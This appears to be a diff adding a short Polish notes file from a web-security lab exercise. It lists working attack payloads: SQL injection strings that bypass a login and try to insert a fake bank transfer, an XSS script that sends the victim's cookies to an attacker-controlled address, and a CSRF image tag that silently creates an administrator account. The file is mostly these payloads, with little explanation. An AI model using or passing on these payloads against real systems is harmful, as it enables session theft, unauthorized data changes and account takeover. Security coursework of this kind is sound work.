@@ -1,0 +1,13 @@
+1.
+SQL:
+wyświetl dane bez dostępu: agnes" OR "1"="1" --
+dodaje (powinno): agnes" union INSERT INTO accounts_transfer VALUES(1001, 'hacker', 8888888888888888, 'hacking mocny', 87676, 2021-01-16, 1000) --
+
+niestety SQLlite nie pozwala na wiele zapytań podczas jednej realizacji .raw().
+XSS i XSRF:
+<script>alert(document.cookie);</script>
+
+mogłoby być coś na kształt:
+<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
+albo:
+Atakujący rejestruje konto, podając w swoim loginie tag: <img src=”http://pro-forum.sekurak/admin/addUser?login=malgorzata4&pass=1234&type=adm”>
